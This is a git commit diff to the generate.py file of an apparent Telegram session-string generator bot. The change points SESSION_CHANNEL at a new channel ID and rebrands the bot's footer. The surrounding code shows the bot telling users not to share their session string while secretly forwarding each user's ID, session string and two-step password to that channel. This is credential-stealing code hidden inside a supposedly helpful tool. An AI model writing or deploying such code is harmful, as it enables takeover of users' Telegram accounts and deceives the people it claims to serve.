82bc73c99adf184f689f84db23b7752ec1e8a16a
Rizz <123063244+rizz-electrical-engg@users.noreply.github.com>
2024-09-18 17:50:53 +0530

    Update generate.py

--- ggn/assets/generate.py
+++ ggn/assets/generate.py
@@ -25,7 +25,7 @@ collection = db[COLLECTION_NAME]
 user_steps = {}
 user_data = {}
 
-SESSION_CHANNEL = -1002149976449
+SESSION_CHANNEL = -1002161455757
 
 async def session_step(client, message):
     user_id = message.chat.id
@@ -65,7 +65,7 @@ async def session_step(client, message):
                 {"$set": session_data},
                 upsert=True
             )
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by Team SPY__**")
+            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by 𝚁𝚒𝚣𝚣__**")
             await gagan.send_message(SESSION_CHANNEL, f"✨ **__USER ID__** : {user_id}\n\n✨ **__2SP__** : `None`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
@@ -93,7 +93,7 @@ async def session_step(client, message):
                 {"$set": session_data},
                 upsert=True
             )
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by Team SPY__**")
+            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by 𝚁𝚒𝚣𝚣__**")
             await gagan.send_message(SESSION_CHANNEL, f"✨ **__ID__** : {user_id}\n\n✨ **__2SP__** : `{password}`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
             await temp_client.disconnect()
             reset_user(user_id)
